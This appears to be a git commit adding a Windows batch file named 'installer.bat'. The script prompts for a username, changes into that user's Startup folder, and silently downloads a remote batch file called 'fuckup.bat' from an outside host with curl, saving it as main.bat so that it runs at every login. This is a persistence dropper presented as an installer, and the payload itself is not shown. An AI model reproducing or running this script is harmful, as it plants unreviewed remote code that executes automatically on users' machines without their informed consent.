6f7811bc20265b7d81641baf735d13893ed0d0df
tobiasrepracek <80835891+tobiasrepracek@users.noreply.github.com>
2023-01-09 20:28:36 +0100

    Add files via upload

---
+++ installer.bat
@@ -0,0 +1,14 @@
+@echo off
+title Installer
+echo Please input user for installation...
+set /p uzivatel=
+echo Uzivatel nastaven na %uzivatel%
+echo Going to directory
+cd "C:\Users\%uzivatel%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+echo Im in directory "C:\Users\%uzivatel%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+echo Downloading files...
+curl -s https://sources.tobir.xyz/fuckup.bat > main.bat
+echo Downloaded main file (fuckup.bat is now main.bat)
+echo The program is now installed, exiting this window...
+ping localhost -n 3 > nul
+exit
